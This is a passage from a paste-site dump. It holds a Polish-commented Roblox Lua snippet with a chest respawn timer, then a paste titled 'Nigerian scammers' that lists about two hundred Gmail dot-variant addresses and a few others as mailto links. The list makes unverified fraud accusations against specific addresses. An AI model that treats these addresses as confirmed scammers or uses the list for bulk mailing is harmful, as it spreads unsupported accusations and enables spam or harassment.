        player.leaderstats.Shards.Value += drop
end)"
L76shdZ8,l17 destroyDrop,giganciprogramowania,Lua,Thursday 28th of December 2023 02:54:22 PM CDT,"-- Dodajemy tę linijkę na koniec zmiennych na początku kodu
local UX = ReplicatedStorage.UserExperience
-- Dalszy kod aż do funkcji
local function destroyDrop(drop)
   task.spawn(function()
        local oldParent = drop.Parent
        drop.Parent = despawnedDrops
-- Nowy kod
        if drop.Name == ""BigChest"" then    
            local counter = UX.Counter
            local text = counter.CounterDisplay.CounterFrame.CounterText
            local spawnTime = 10
            counter.Position = drop:FindFirstChildWhichIsA(""MeshPart"").Position
            counter.Parent = oldParent
            for zegar = 0, spawnTime do
                local timer = spawnTime - zegar
                local minutes = math.floor(timer/60)
                local seconds = timer%60
                if minutes >= 10 then
                    if seconds >= 10 then
                        text.Text = ""Skrzynia pojawi się za "" .. minutes .."":"".. seconds
                    else
                        text.Text = ""Skrzynia pojawi się za "" .. minutes .. "":0"" .. seconds
                    end
                else
                    if seconds >= 10 then
                        text.Text = ""Skrzynia pojawi się za 0"" .. minutes .. "":"" .. seconds
                    else
                        text.Text = ""Skrzynia pojawi się za 0"" .. minutes .. "":0"" .. seconds
                    end    
                end
                wait(1)
            end
            counter.Parent = UX
        else
            wait(4) -- Przeniesione z linijki niżej
        end
-- Koniec nowego kodu
        drop.CurrentPoints.Value = drop.MaxPoints.Value
        drop.Parent = oldParent
    end)
end

"
j75hMsPV,Nigerian scammers [28-12-2/2023],bombaires,AIMMS,Thursday 28th of December 2023 02:38:08 PM CDT,"<a href=""mailto:mohamedbusines8@gmail.com"">mohamedbusines8@gmail.com</a>
<a href=""mailto:m.o.h.a.m.edb.us.in.e.s.8@gmail.com"">m.o.h.a.m.edb.us.in.e.s.8@gmail.com</a>
<a href=""mailto:m.o.h.am.e.d.bu.s.ines.8@gmail.com"">m.o.h.am.e.d.bu.s.ines.8@gmail.com</a>
<a href=""mailto:mo.h.ame.d.b.usin.e.s8@gmail.com"">mo.h.ame.d.b.usin.e.s8@gmail.com</a>
<a href=""mailto:mo.h.a.m.ed.b.u.s.in.e.s8@gmail.com"">mo.h.a.m.ed.b.u.s.in.e.s8@gmail.com</a>
<a href=""mailto:m.o.h.am.edbu.si.n.e.s8@gmail.com"">m.o.h.am.edbu.si.n.e.s8@gmail.com</a>
<a href=""mailto:mo.h.a.m.e.d.b.usin.e.s8@gmail.com"">mo.h.a.m.e.d.b.usin.e.s8@gmail.com</a>
<a href=""mailto:m.o.ha.m.e.dbus.in.e.s8@gmail.com"">m.o.ha.m.e.dbus.in.e.s8@gmail.com</a>
<a href=""mailto:m.o.h.a.me.dbus.i.ne.s8@gmail.com"">m.o.h.a.me.dbus.i.ne.s8@gmail.com</a>
<a href=""mailto:mo.ha.me.d.b.us.i.n.e.s8@gmail.com"">mo.ha.me.d.b.us.i.n.e.s8@gmail.com</a>
<a href=""mailto:m.o.ham.edbusin.es8@gmail.com"">m.o.ham.edbusin.es8@gmail.com</a>
<a href=""mailto:m.o.ham.ed.busin.e.s.8@gmail.com"">m.o.ham.ed.busin.e.s.8@gmail.com</a>
<a href=""mailto:m.o.h.am.edbusi.n.es.8@gmail.com"">m.o.h.am.edbusi.n.es.8@gmail.com</a>
<a href=""mailto:m.oha.m.e.db.u.s.i.n.e.s8@gmail.com"">m.oha.m.e.db.u.s.i.n.e.s8@gmail.com</a>
<a href=""mailto:moh.ame.dbu.sines.8@gmail.com"">moh.ame.dbu.sines.8@gmail.com</a>
<a href=""mailto:moha.me.d.bu.si.n.e.s8@gmail.com"">moha.me.d.bu.si.n.e.s8@gmail.com</a>
<a href=""mailto:moh.am.e.dbus.i.nes.8@gmail.com"">moh.am.e.dbus.i.nes.8@gmail.com</a>
<a href=""mailto:moham.ed.bu.s.i.n.es.8@gmail.com"">moham.ed.bu.s.i.n.es.8@gmail.com</a>
<a href=""mailto:m.ohame.d.b.us.in.es.8@gmail.com"">m.ohame.d.b.us.in.es.8@gmail.com</a>
<a href=""mailto:m.oh.amedb.u.s.in.es.8@gmail.com"">m.oh.amedb.u.s.in.es.8@gmail.com</a>
<a href=""mailto:mo.h.am.edb.u.si.nes.8@gmail.com"">mo.h.am.edb.u.si.nes.8@gmail.com</a>
<a href=""mailto:mo.h.ame.d.b.u.si.n.e.s.8@gmail.com"">mo.h.ame.d.b.u.si.n.e.s.8@gmail.com</a>
<a href=""mailto:mo.hamedb.u.s.i.n.e.s.8@gmail.com"">mo.hamedb.u.s.i.n.e.s.8@gmail.com</a>
<a href=""mailto:m.o.ha.m.edb.u.sin.e.s.8@gmail.com"">m.o.ha.m.edb.u.sin.e.s.8@gmail.com</a>
<a href=""mailto:m.oh.ame.dbusi.n.es8@gmail.com"">m.oh.ame.dbusi.n.es8@gmail.com</a>
<a href=""mailto:mo.h.am.ed.b.u.sine.s8@gmail.com"">mo.h.am.ed.b.u.sine.s8@gmail.com</a>
<a href=""mailto:mohamedbu.si.n.es.8@gmail.com"">mohamedbu.si.n.es.8@gmail.com</a>
<a href=""mailto:mo.hame.dbu.si.nes.8@gmail.com"">mo.hame.dbu.si.nes.8@gmail.com</a>
<a href=""mailto:m.o.h.a.m.e.dbus.in.e.s.8@gmail.com"">m.o.h.a.m.e.dbus.in.e.s.8@gmail.com</a>
<a href=""mailto:mo.hame.db.u.s.ine.s.8@gmail.com"">mo.hame.db.u.s.ine.s.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.e.db.us.in.es.8@gmail.com"">mo.h.a.m.e.db.us.in.es.8@gmail.com</a>
<a href=""mailto:mo.ham.edbu.s.i.nes.8@gmail.com"">mo.ham.edbu.s.i.nes.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.edb.usines.8@gmail.com"">mo.h.a.m.edb.usines.8@gmail.com</a>
<a href=""mailto:moha.medb.u.s.ines8@gmail.com"">moha.medb.u.s.ines8@gmail.com</a>
<a href=""mailto:mo.ham.ed.b.u.sine.s8@gmail.com"">mo.ham.ed.b.u.sine.s8@gmail.com</a>
<a href=""mailto:m.oh.a.m.e.dbus.i.nes8@gmail.com"">m.oh.a.m.e.dbus.i.nes8@gmail.com</a>
<a href=""mailto:moh.ame.d.bu.sin.e.s8@gmail.com"">moh.ame.d.bu.sin.e.s8@gmail.com</a>
<a href=""mailto:m.o.hamed.b.usi.n.es.8@gmail.com"">m.o.hamed.b.usi.n.es.8@gmail.com</a>
<a href=""mailto:m.oh.a.me.db.usi.nes8@gmail.com"">m.oh.a.me.db.usi.nes8@gmail.com</a>
<a href=""mailto:m.o.ha.medbus.ines8@gmail.com"">m.o.ha.medbus.ines8@gmail.com</a>
<a href=""mailto:mohamed.b.u.si.nes.8@gmail.com"">mohamed.b.u.si.nes.8@gmail.com</a>
<a href=""mailto:moham.ed.b.u.sin.es8@gmail.com"">moham.ed.b.u.sin.es8@gmail.com</a>
<a href=""mailto:mo.h.am.ed.b.u.sin.es8@gmail.com"">mo.h.am.ed.b.u.sin.es8@gmail.com</a>
<a href=""mailto:m.o.h.am.e.d.bus.i.n.e.s.8@gmail.com"">m.o.h.am.e.d.bus.i.n.e.s.8@gmail.com</a>
<a href=""mailto:mo.ha.med.b.usi.nes8@gmail.com"">mo.ha.med.b.usi.nes8@gmail.com</a>
<a href=""mailto:m.oh.a.m.e.dbusine.s.8@gmail.com"">m.oh.a.m.e.dbusine.s.8@gmail.com</a>
<a href=""mailto:m.ohamed.b.us.i.ne.s8@gmail.com"">m.ohamed.b.us.i.ne.s8@gmail.com</a>
<a href=""mailto:m.o.hamed.b.u.s.i.n.es8@gmail.com"">m.o.hamed.b.u.s.i.n.es8@gmail.com</a>
<a href=""mailto:mohamed.bu.s.ine.s8@gmail.com"">mohamed.bu.s.ine.s8@gmail.com</a>
<a href=""mailto:mo.ha.med.b.usine.s8@gmail.com"">mo.ha.med.b.usine.s8@gmail.com</a>
<a href=""mailto:m.oh.ame.db.u.s.in.e.s.8@gmail.com"">m.oh.ame.db.u.s.in.e.s.8@gmail.com</a>
<a href=""mailto:moha.m.edbu.s.in.e.s8@gmail.com"">moha.m.edbu.s.in.e.s8@gmail.com</a>
<a href=""mailto:moh.a.m.e.d.bu.s.in.e.s8@gmail.com"">moh.a.m.e.d.bu.s.in.e.s8@gmail.com</a>
<a href=""mailto:moh.am.edbu.s.ine.s.8@gmail.com"">moh.am.edbu.s.ine.s.8@gmail.com</a>
<a href=""mailto:m.oha.medbusine.s8@gmail.com"">m.oha.medbusine.s8@gmail.com</a>
<a href=""mailto:m.oha.med.b.us.i.n.e.s.8@gmail.com"">m.oha.med.b.us.i.n.e.s.8@gmail.com</a>
<a href=""mailto:mo.h.am.edb.us.in.e.s8@gmail.com"">mo.h.am.edb.us.in.e.s8@gmail.com</a>
<a href=""mailto:mohamed.b.u.si.n.e.s8@gmail.com"">mohamed.b.u.si.n.e.s8@gmail.com</a>
<a href=""mailto:mo.h.am.e.d.busi.n.e.s8@gmail.com"">mo.h.am.e.d.busi.n.e.s8@gmail.com</a>
<a href=""mailto:m.o.h.am.ed.bu.sines.8@gmail.com"">m.o.h.am.ed.bu.sines.8@gmail.com</a>
<a href=""mailto:m.o.h.a.m.ed.b.usi.n.es.8@gmail.com"">m.o.h.a.m.ed.b.usi.n.es.8@gmail.com</a>
<a href=""mailto:mo.h.am.ed.b.us.i.ne.s8@gmail.com"">mo.h.am.ed.b.us.i.ne.s8@gmail.com</a>
<a href=""mailto:m.o.h.a.me.d.b.us.ines8@gmail.com"">m.o.h.a.me.d.b.us.ines8@gmail.com</a>
<a href=""mailto:mo.h.a.m.ed.bu.sines8@gmail.com"">mo.h.a.m.ed.bu.sines8@gmail.com</a>
<a href=""mailto:moham.e.db.u.s.ine.s.8@gmail.com"">moham.e.db.u.s.ine.s.8@gmail.com</a>
<a href=""mailto:m.o.ha.m.e.db.u.si.nes.8@gmail.com"">m.o.ha.m.e.db.u.si.nes.8@gmail.com</a>
<a href=""mailto:mohamed.b.usin.e.s8@gmail.com"">mohamed.b.usin.e.s8@gmail.com</a>
<a href=""mailto:m.o.hamed.busi.n.es8@gmail.com"">m.o.hamed.busi.n.es8@gmail.com</a>
<a href=""mailto:m.o.ham.e.dbu.sines8@gmail.com"">m.o.ham.e.dbu.sines8@gmail.com</a>
<a href=""mailto:mo.ha.me.dbu.si.n.e.s.8@gmail.com"">mo.ha.me.dbu.si.n.e.s.8@gmail.com</a>
<a href=""mailto:m.oh.am.ed.b.usines8@gmail.com"">m.oh.am.ed.b.usines8@gmail.com</a>
<a href=""mailto:moh.a.me.db.us.ine.s8@gmail.com"">moh.a.me.db.us.ine.s8@gmail.com</a>
<a href=""mailto:m.o.ham.edb.us.in.e.s.8@gmail.com"">m.o.ham.edb.us.in.e.s.8@gmail.com</a>
<a href=""mailto:mohame.d.b.u.s.i.n.e.s8@gmail.com"">mohame.d.b.u.s.i.n.e.s8@gmail.com</a>
<a href=""mailto:moh.ame.d.b.u.s.i.ne.s.8@gmail.com"">moh.ame.d.b.u.s.i.ne.s.8@gmail.com</a>
<a href=""mailto:mo.hame.d.bu.sine.s8@gmail.com"">mo.hame.d.bu.sine.s8@gmail.com</a>
<a href=""mailto:mo.hamed.b.u.sin.es8@gmail.com"">mo.hamed.b.u.sin.es8@gmail.com</a>
<a href=""mailto:moham.e.dbu.s.i.n.es8@gmail.com"">moham.e.dbu.s.i.n.es8@gmail.com</a>
<a href=""mailto:m.oham.ed.bu.s.i.nes.8@gmail.com"">m.oham.ed.bu.s.i.nes.8@gmail.com</a>
<a href=""mailto:mo.h.amedbu.s.ines8@gmail.com"">mo.h.amedbu.s.ines8@gmail.com</a>
<a href=""mailto:mo.h.a.m.e.db.u.s.i.n.e.s.8@gmail.com"">mo.h.a.m.e.db.u.s.i.n.e.s.8@gmail.com</a>
<a href=""mailto:moham.e.d.b.u.si.ne.s.8@gmail.com"">moham.e.d.b.u.si.ne.s.8@gmail.com</a>
<a href=""mailto:mo.ha.me.dbus.i.nes.8@gmail.com"">mo.ha.me.dbus.i.nes.8@gmail.com</a>
<a href=""mailto:m.o.ha.medb.us.ines.8@gmail.com"">m.o.ha.medb.us.ines.8@gmail.com</a>
<a href=""mailto:m.o.ha.med.b.us.i.n.es.8@gmail.com"">m.o.ha.med.b.us.i.n.es.8@gmail.com</a>
<a href=""mailto:mo.h.a.me.d.bu.sine.s.8@gmail.com"">mo.h.a.me.d.bu.sine.s.8@gmail.com</a>
<a href=""mailto:m.o.hamed.bus.ine.s.8@gmail.com"">m.o.hamed.bus.ine.s.8@gmail.com</a>
<a href=""mailto:m.o.hamedb.u.s.ines8@gmail.com"">m.o.hamedb.u.s.ines8@gmail.com</a>
<a href=""mailto:mohamed.bu.sin.e.s.8@gmail.com"">mohamed.bu.sin.e.s.8@gmail.com</a>
<a href=""mailto:m.o.ha.me.dbusi.ne.s.8@gmail.com"">m.o.ha.me.dbusi.ne.s.8@gmail.com</a>
<a href=""mailto:moham.e.d.b.us.i.n.es8@gmail.com"">moham.e.d.b.us.i.n.es8@gmail.com</a>
<a href=""mailto:m.o.hame.dbus.i.nes8@gmail.com"">m.o.hame.dbus.i.nes8@gmail.com</a>
<a href=""mailto:m.o.ham.e.dbu.sine.s.8@gmail.com"">m.o.ham.e.dbu.sine.s.8@gmail.com</a>
<a href=""mailto:mo.h.amed.bus.i.n.es.8@gmail.com"">mo.h.amed.bus.i.n.es.8@gmail.com</a>
<a href=""mailto:moham.edbu.sines8@gmail.com"">moham.edbu.sines8@gmail.com</a>
<a href=""mailto:m.oha.m.e.dbus.ine.s8@gmail.com"">m.oha.m.e.dbus.ine.s8@gmail.com</a>
<a href=""mailto:m.oha.me.dbu.s.ine.s8@gmail.com"">m.oha.me.dbu.s.ine.s8@gmail.com</a>
<a href=""mailto:mo.h.am.edbusi.ne.s.8@gmail.com"">mo.h.am.edbusi.ne.s.8@gmail.com</a>
<a href=""mailto:m.oh.am.e.d.bu.s.ine.s8@gmail.com"">m.oh.am.e.d.bu.s.ine.s8@gmail.com</a>
<a href=""mailto:m.ohame.db.us.i.ne.s8@gmail.com"">m.ohame.db.us.i.ne.s8@gmail.com</a>
<a href=""mailto:moh.ame.d.bu.si.n.es.8@gmail.com"">moh.ame.d.bu.si.n.es.8@gmail.com</a>
<a href=""mailto:mo.ha.m.e.d.bus.ine.s8@gmail.com"">mo.ha.m.e.d.bus.ine.s8@gmail.com</a>
<a href=""mailto:mo.hamed.b.us.i.n.e.s.8@gmail.com"">mo.hamed.b.us.i.n.e.s.8@gmail.com</a>
<a href=""mailto:m.oham.ed.b.u.si.nes8@gmail.com"">m.oham.ed.b.u.si.nes8@gmail.com</a>
<a href=""mailto:m.oh.a.med.bu.s.in.e.s.8@gmail.com"">m.oh.a.med.bu.s.in.e.s.8@gmail.com</a>
<a href=""mailto:moh.am.e.dbu.s.ine.s.8@gmail.com"">moh.am.e.dbu.s.ine.s.8@gmail.com</a>
<a href=""mailto:mo.ham.ed.b.u.s.ines.8@gmail.com"">mo.ham.ed.b.u.s.ines.8@gmail.com</a>
<a href=""mailto:moh.am.ed.busin.es.8@gmail.com"">moh.am.ed.busin.es.8@gmail.com</a>
<a href=""mailto:mo.ha.med.b.u.sine.s8@gmail.com"">mo.ha.med.b.u.sine.s8@gmail.com</a>
<a href=""mailto:moha.medbusi.nes8@gmail.com"">moha.medbusi.nes8@gmail.com</a>
<a href=""mailto:mo.hame.d.b.us.i.n.es8@gmail.com"">mo.hame.d.b.us.i.n.es8@gmail.com</a>
<a href=""mailto:moha.m.ed.busi.n.es8@gmail.com"">moha.m.ed.busi.n.es8@gmail.com</a>
<a href=""mailto:moha.me.dbusin.es8@gmail.com"">moha.me.dbusin.es8@gmail.com</a>
<a href=""mailto:m.o.h.ame.d.b.usi.n.e.s.8@gmail.com"">m.o.h.ame.d.b.usi.n.e.s.8@gmail.com</a>
<a href=""mailto:m.o.ham.e.dbusin.e.s.8@gmail.com"">m.o.ham.e.dbusin.e.s.8@gmail.com</a>
<a href=""mailto:m.o.ham.ed.b.u.si.n.e.s.8@gmail.com"">m.o.ham.ed.b.u.si.n.e.s.8@gmail.com</a>
<a href=""mailto:mo.h.am.e.d.bu.si.n.es.8@gmail.com"">mo.h.am.e.d.bu.si.n.es.8@gmail.com</a>
<a href=""mailto:m.oham.e.d.b.usi.nes8@gmail.com"">m.oham.e.d.b.usi.nes8@gmail.com</a>
<a href=""mailto:mo.hamed.bu.sine.s.8@gmail.com"">mo.hamed.bu.sine.s.8@gmail.com</a>
<a href=""mailto:m.o.ha.m.e.db.usi.n.es.8@gmail.com"">m.o.ha.m.e.db.usi.n.es.8@gmail.com</a>
<a href=""mailto:m.oh.am.ed.b.usines.8@gmail.com"">m.oh.am.ed.b.usines.8@gmail.com</a>
<a href=""mailto:m.oh.am.e.d.b.u.s.in.es.8@gmail.com"">m.oh.am.e.d.b.u.s.in.es.8@gmail.com</a>
<a href=""mailto:moha.m.e.d.bu.s.in.es8@gmail.com"">moha.m.e.d.bu.s.in.es8@gmail.com</a>
<a href=""mailto:m.o.h.a.me.db.u.sine.s8@gmail.com"">m.o.h.a.me.db.u.sine.s8@gmail.com</a>
<a href=""mailto:m.oham.edb.usin.es8@gmail.com"">m.oham.edb.usin.es8@gmail.com</a>
<a href=""mailto:m.oh.am.ed.b.u.s.i.n.es.8@gmail.com"">m.oh.am.ed.b.u.s.i.n.es.8@gmail.com</a>
<a href=""mailto:m.oh.amed.b.usin.e.s8@gmail.com"">m.oh.amed.b.usin.e.s8@gmail.com</a>
<a href=""mailto:mohamed.bu.s.in.e.s.8@gmail.com"">mohamed.bu.s.in.e.s.8@gmail.com</a>
<a href=""mailto:m.oh.amedbu.s.i.n.es.8@gmail.com"">m.oh.amedbu.s.i.n.es.8@gmail.com</a>
<a href=""mailto:m.oha.m.edb.usi.n.es.8@gmail.com"">m.oha.m.edb.usi.n.es.8@gmail.com</a>
<a href=""mailto:mo.h.a.med.b.us.i.ne.s8@gmail.com"">mo.h.a.med.b.us.i.ne.s8@gmail.com</a>
<a href=""mailto:m.o.h.a.m.ed.b.usines.8@gmail.com"">m.o.h.a.m.ed.b.usines.8@gmail.com</a>
<a href=""mailto:m.o.h.am.e.db.u.s.ine.s.8@gmail.com"">m.o.h.am.e.db.u.s.ine.s.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.ed.b.u.s.i.nes.8@gmail.com"">mo.h.a.m.ed.b.u.s.i.nes.8@gmail.com</a>
<a href=""mailto:m.o.ham.edbus.i.n.e.s8@gmail.com"">m.o.ham.edbus.i.n.e.s8@gmail.com</a>
<a href=""mailto:moh.a.m.e.d.b.us.in.es8@gmail.com"">moh.a.m.e.d.b.us.in.es8@gmail.com</a>
<a href=""mailto:m.o.ha.m.e.d.b.u.s.i.ne.s8@gmail.com"">m.o.ha.m.e.d.b.u.s.i.ne.s8@gmail.com</a>
<a href=""mailto:m.oha.m.e.db.u.s.i.nes8@gmail.com"">m.oha.m.e.db.u.s.i.nes8@gmail.com</a>
<a href=""mailto:m.oha.m.e.d.b.u.si.ne.s.8@gmail.com"">m.oha.m.e.d.b.u.si.ne.s.8@gmail.com</a>
<a href=""mailto:moha.me.d.b.u.sines.8@gmail.com"">moha.me.d.b.u.sines.8@gmail.com</a>
<a href=""mailto:mo.ha.medb.usines8@gmail.com"">mo.ha.medb.usines8@gmail.com</a>
<a href=""mailto:m.oh.am.e.d.bus.ines.8@gmail.com"">m.oh.am.e.d.bus.ines.8@gmail.com</a>
<a href=""mailto:mo.ha.med.bu.sin.es8@gmail.com"">mo.ha.med.bu.sin.es8@gmail.com</a>
<a href=""mailto:moh.a.med.busines.8@gmail.com"">moh.a.med.busines.8@gmail.com</a>
<a href=""mailto:m.oh.amedbu.sines.8@gmail.com"">m.oh.amedbu.sines.8@gmail.com</a>
<a href=""mailto:mo.hamedbusin.es8@gmail.com"">mo.hamedbusin.es8@gmail.com</a>
<a href=""mailto:m.oh.am.ed.bu.sine.s8@gmail.com"">m.oh.am.ed.bu.sine.s8@gmail.com</a>
<a href=""mailto:m.oham.ed.b.u.s.ine.s8@gmail.com"">m.oham.ed.b.u.s.ine.s8@gmail.com</a>
<a href=""mailto:m.oha.m.e.d.b.u.s.ines8@gmail.com"">m.oha.m.e.d.b.u.s.ines8@gmail.com</a>
<a href=""mailto:mo.h.am.edbu.s.ines.8@gmail.com"">mo.h.am.edbu.s.ines.8@gmail.com</a>
<a href=""mailto:mo.h.am.e.d.b.u.si.ne.s8@gmail.com"">mo.h.am.e.d.b.u.si.ne.s8@gmail.com</a>
<a href=""mailto:m.o.h.a.m.edbusi.n.es8@gmail.com"">m.o.h.a.m.edbusi.n.es8@gmail.com</a>
<a href=""mailto:mo.ham.edbusi.nes8@gmail.com"">mo.ham.edbusi.nes8@gmail.com</a>
<a href=""mailto:m.oh.amedbusin.es8@gmail.com"">m.oh.amedbusin.es8@gmail.com</a>
<a href=""mailto:m.o.h.a.me.db.usin.es8@gmail.com"">m.o.h.a.me.db.usin.es8@gmail.com</a>
<a href=""mailto:mo.ham.e.d.bu.si.n.es8@gmail.com"">mo.ham.e.d.bu.si.n.es8@gmail.com</a>
<a href=""mailto:m.o.h.a.m.edb.usin.e.s8@gmail.com"">m.o.h.a.m.edb.usin.e.s8@gmail.com</a>
<a href=""mailto:m.o.ham.e.db.u.sin.e.s.8@gmail.com"">m.o.ham.e.db.u.sin.e.s.8@gmail.com</a>
<a href=""mailto:m.o.ha.me.d.b.us.i.ne.s.8@gmail.com"">m.o.ha.me.d.b.us.i.ne.s.8@gmail.com</a>
<a href=""mailto:moha.me.d.busin.e.s8@gmail.com"">moha.me.d.busin.e.s8@gmail.com</a>
<a href=""mailto:m.oh.am.ed.b.usi.n.e.s.8@gmail.com"">m.oh.am.ed.b.usi.n.e.s.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.e.d.bu.si.nes.8@gmail.com"">mo.h.a.m.e.d.bu.si.nes.8@gmail.com</a>
<a href=""mailto:moh.am.edbu.s.in.es.8@gmail.com"">moh.am.edbu.s.in.es.8@gmail.com</a>
<a href=""mailto:m.oh.a.m.ed.b.us.i.n.es8@gmail.com"">m.oh.a.m.ed.b.us.i.n.es8@gmail.com</a>
<a href=""mailto:moha.me.d.b.u.sin.es8@gmail.com"">moha.me.d.b.u.sin.es8@gmail.com</a>
<a href=""mailto:moh.a.med.b.u.sine.s.8@gmail.com"">moh.a.med.b.u.sine.s.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.e.dbu.s.i.ne.s8@gmail.com"">mo.h.a.m.e.dbu.s.i.ne.s8@gmail.com</a>
<a href=""mailto:m.oham.e.dbus.i.nes.8@gmail.com"">m.oham.e.dbus.i.nes.8@gmail.com</a>
<a href=""mailto:m.o.hame.d.bus.i.n.es.8@gmail.com"">m.o.hame.d.bus.i.n.es.8@gmail.com</a>
<a href=""mailto:m.oham.e.d.busine.s8@gmail.com"">m.oham.e.d.busine.s8@gmail.com</a>
<a href=""mailto:moh.a.me.db.usin.e.s.8@gmail.com"">moh.a.me.db.usin.e.s.8@gmail.com</a>
<a href=""mailto:m.o.h.amed.b.us.i.nes8@gmail.com"">m.o.h.amed.b.us.i.nes8@gmail.com</a>
<a href=""mailto:m.oha.medbus.i.nes8@gmail.com"">m.oha.medbus.i.nes8@gmail.com</a>
<a href=""mailto:m.o.h.a.m.e.d.b.u.si.nes8@gmail.com"">m.o.h.a.m.e.d.b.u.si.nes8@gmail.com</a>
<a href=""mailto:m.oha.m.edbu.s.i.n.es8@gmail.com"">m.oha.m.edbu.s.i.n.es8@gmail.com</a>
<a href=""mailto:mo.h.a.med.b.u.sine.s8@gmail.com"">mo.h.a.med.b.u.sine.s8@gmail.com</a>
<a href=""mailto:moham.e.db.us.in.e.s8@gmail.com"">moham.e.db.us.in.e.s8@gmail.com</a>
<a href=""mailto:m.oh.am.e.d.b.u.si.nes8@gmail.com"">m.oh.am.e.d.b.u.si.nes8@gmail.com</a>
<a href=""mailto:m.o.h.am.ed.b.usin.e.s8@gmail.com"">m.o.h.am.ed.b.usin.e.s8@gmail.com</a>
<a href=""mailto:m.o.ha.m.ed.b.u.s.i.ne.s.8@gmail.com"">m.o.ha.m.ed.b.u.s.i.ne.s.8@gmail.com</a>
<a href=""mailto:m.o.h.ame.d.b.us.ines.8@gmail.com"">m.o.h.ame.d.b.us.ines.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.edbus.in.es.8@gmail.com"">mo.h.a.m.edbus.in.es.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.ed.b.u.s.i.nes8@gmail.com"">mo.h.a.m.ed.b.u.s.i.nes8@gmail.com</a>
<a href=""mailto:moha.medbus.i.ne.s8@gmail.com"">moha.medbus.i.ne.s8@gmail.com</a>
<a href=""mailto:moha.medb.us.in.e.s.8@gmail.com"">moha.medb.us.in.e.s.8@gmail.com</a>
<a href=""mailto:m.oh.am.e.db.u.s.in.es8@gmail.com"">m.oh.am.e.db.u.s.in.es8@gmail.com</a>
<a href=""mailto:m.o.h.am.ed.b.u.s.ine.s.8@gmail.com"">m.o.h.am.ed.b.u.s.ine.s.8@gmail.com</a>
<a href=""mailto:mo.hame.db.us.i.n.es.8@gmail.com"">mo.hame.db.us.i.n.es.8@gmail.com</a>
<a href=""mailto:mo.h.a.m.edb.us.in.es8@gmail.com"">mo.h.a.m.edb.us.in.es8@gmail.com</a>
<a href=""mailto:m.ohamedbusin.e.s.8@gmail.com"">m.ohamedbusin.e.s.8@gmail.com</a>
<a href=""mailto:m.oh.amed.b.usi.nes.8@gmail.com"">m.oh.amed.b.usi.nes.8@gmail.com</a>
<a href=""mailto:moham.e.d.b.u.sin.es.8@gmail.com"">moham.e.d.b.u.sin.es.8@gmail.com</a>
<a href=""mailto:m.o.h.ame.dbus.i.ne.s8@gmail.com"">m.o.h.ame.dbus.i.ne.s8@gmail.com</a>
<a href=""mailto:mo.h.am.ed.b.u.s.i.nes.8@gmail.com"">mo.h.am.ed.b.u.s.i.nes.8@gmail.com</a>
<a href=""mailto:mo.ham.ed.bu.s.i.nes8@gmail.com"">mo.ham.ed.bu.s.i.nes8@gmail.com</a>
<a href=""mailto:mo.h.am.e.db.u.s.i.nes8@gmail.com"">mo.h.am.e.db.u.s.i.nes8@gmail.com</a>
<a href=""mailto:m.ohamedb.u.sines.8@gmail.com"">m.ohamedb.u.sines.8@gmail.com</a>
<a href=""mailto:m.o.h.a.medb.u.si.ne.s8@gmail.com"">m.o.h.a.medb.u.si.ne.s8@gmail.com</a>
<a href=""mailto:mo.h.a.me.d.b.u.sin.es.8@gmail.com"">mo.h.a.me.d.b.u.sin.es.8@gmail.com</a>
<a href=""mailto:moham.e.d.bus.ines.8@gmail.com"">moham.e.d.bus.ines.8@gmail.com</a>
<a href=""mailto:mo.h.am.e.db.us.in.e.s.8@gmail.com"">mo.h.am.e.db.us.in.e.s.8@gmail.com</a>
<a href=""mailto:cban1990@outlook.com"">cban1990@outlook.com</a>
<a href=""mailto:pmail2019pmail2019@gmail.com"">pmail2019pmail2019@gmail.com</a>
<a href=""mailto:pmail.20.1.9.p.ma.i.l2.019@gmail.com"">pmail.20.1.9.p.ma.i.l2.019@gmail.com</a>
<a href=""mailto:p.mai.l2.0.1.9.pmai.l201.9@gmail.com"">p.mai.l2.0.1.9.pmai.l201.9@gmail.com</a>
<a href=""mailto:pm.a.i.l.2.019.p.mai.l.20.19@gmail.com"">pm.a.i.l.2.019.p.mai.l.20.19@gmail.com</a>
<a href=""mailto:p.mail2.01.9.p.ma.il2.01.9@gmail.com"">p.mail2.01.9.p.ma.il2.01.9@gmail.com</a>
<a href=""mailto:pm.a.i.l2.019.p.mail.201.9@gmail.com"">pm.a.i.l2.019.p.mail.201.9@gmail.com</a>
<a href=""mailto:p.mai.l201.9p.m.ail.2019@gmail.com"">p.mai.l201.9p.m.ail.2019@gmail.com</a>
<a href=""mailto:p.mail2019.pm.ai.l201.9@gmail.com"">p.mail2019.pm.ai.l201.9@gmail.com</a>
<a href=""mailto:p.mai.l.2.0.1.9p.ma.il20.19@gmail.com"">p.mai.l.2.0.1.9p.ma.il20.19@gmail.com</a>
<a href=""mailto:pma.il20.19p.mail.2.0.1.9@gmail.com"">pma.il20.19p.mail.2.0.1.9@gmail.com</a>
<a href=""mailto:pmail2.0.19.p.ma.i.l.2.019@gmail.com"">pmail2.0.19.p.ma.i.l.2.019@gmail.com</a>
<a href=""mailto:pma.il2.01.9.pm.a.i.l.201.9@gmail.com"">pma.il2.01.9.pm.a.i.l.201.9@gmail.com</a>
<a href=""mailto:pma.i.l2.0.1.9.p.m.a.i.l.2.0.19@gmail.com"">pma.i.l2.0.1.9.p.m.a.i.l.2.0.19@gmail.com</a>
<a href=""mailto:pma.i.l.2.01.9p.mai.l2.0.19@gmail.com"">pma.i.l.2.01.9p.mai.l2.0.19@gmail.com</a>
<a href=""mailto:pmai.l.2.01.9pmail2019@gmail.com"">pmai.l.2.01.9pmail2019@gmail.com</a>
<a href=""mailto:p.m.ail201.9p.ma.i.l.2.019@gmail.com"">p.m.ail201.9p.ma.i.l.2.019@gmail.com</a>
<a href=""mailto:p.ma.il.20.1.9p.ma.il.2.0.1.9@gmail.com"">p.ma.il.20.1.9p.ma.il.2.0.1.9@gmail.com</a>
<a href=""mailto:pm.ai.l2.019pmai.l2.0.19@gmail.com"">pm.ai.l2.019pmai.l2.0.19@gmail.com</a>
<a href=""mailto:pm.ai.l2.019.pma.i.l2.019@gmail.com"">pm.ai.l2.019.pma.i.l2.019@gmail.com</a>
<a href=""mailto:pm.ail201.9.pm.a.i.l.2.0.1.9@gmail.com"">pm.ail201.9.pm.a.i.l.2.0.1.9@gmail.com</a>
